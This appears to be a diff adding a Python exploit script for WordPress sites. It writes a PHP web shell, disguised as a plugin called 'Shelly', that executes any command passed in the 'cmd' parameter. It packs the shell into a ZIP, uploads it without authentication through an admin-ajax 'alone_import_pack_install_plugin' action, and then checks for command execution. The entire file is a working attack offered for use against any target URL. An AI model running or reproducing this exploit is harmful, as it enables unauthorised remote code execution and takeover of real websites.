@@ -1,0 +1,70 @@
+import requests
+import zipfile
+import os
+import sys
+
+# ============ CONFIGURATION ============
+TARGET = sys.argv[1] if len(sys.argv) > 1 else None
+PLUGIN_NAME = "Shelly"
+ZIP_NAME = "Shelly.zip"
+SHELL_NAME = "Shelly.php"
+SHELL_PATH = f"wp-content/plugins/{PLUGIN_NAME}/{SHELL_NAME}"
+CMD_PARAM = "cmd"
+TEST_CMD = "id"
+# =======================================
+
+def create_zip():
+    os.makedirs(PLUGIN_NAME, exist_ok=True)
+    payload = f"""<?php
+/*
+Plugin Name: Shelly
+*/
+if(isset($_GET['{CMD_PARAM}'])) {{
+    echo "<pre>";
+    system($_GET['{CMD_PARAM}']);
+    echo "</pre>";
+}} ?>"""
+    with open(f"{PLUGIN_NAME}/{SHELL_NAME}", "w") as f:
+        f.write(payload)
+
+    with zipfile.ZipFile(ZIP_NAME, 'w') as zipf:
+        zipf.write(f"{PLUGIN_NAME}/{SHELL_NAME}", f"{PLUGIN_NAME}/{SHELL_NAME}")
+    print(f"[+] ZIP {ZIP_NAME} created.")
+
+def upload_zip(target_url):
+    upload_url = f"{target_url}/wp-admin/admin-ajax.php?action=alone_import_pack_install_plugin"
+    files = {'file': (ZIP_NAME, open(ZIP_NAME, 'rb'), 'application/zip')}
+    print(f"[+] Sending ZIP to {upload_url} ...")
+    r = requests.post(upload_url, files=files)
+    print(f"[+] Response: {r.status_code}")
+    if r.status_code == 200:
+        print("[+] Upload seems successful.")
+        return True
+    else:
+        print("[-] Upload failed.")
+        return False
+
+def test_shell(target_url):
+    shell_url = f"{target_url}/{SHELL_PATH}?{CMD_PARAM}={TEST_CMD}"
+    print(f"[+] Testing shell: {shell_url}")
+    try:
+        r = requests.get(shell_url, timeout=10)
+        if r.status_code == 200 and "uid=" in r.text:
+            print("[✅] Shell active!")
+            print("[!] Shell URL:", shell_url)
+            print("[!] Example usage: ?cmd=whoami")
+        else:
+            print("[-] Shell not working or patched.")
+    except Exception as e:
+        print("[-] Connection error:", e)
+
+def main():
+    if not TARGET:
+        print(f"Usage: {sys.argv[0]} https://target.com")
+        return
+    create_zip()
+    if upload_zip(TARGET):
+        test_shell(TARGET)
+
+if __name__ == "__main__":
+    main()
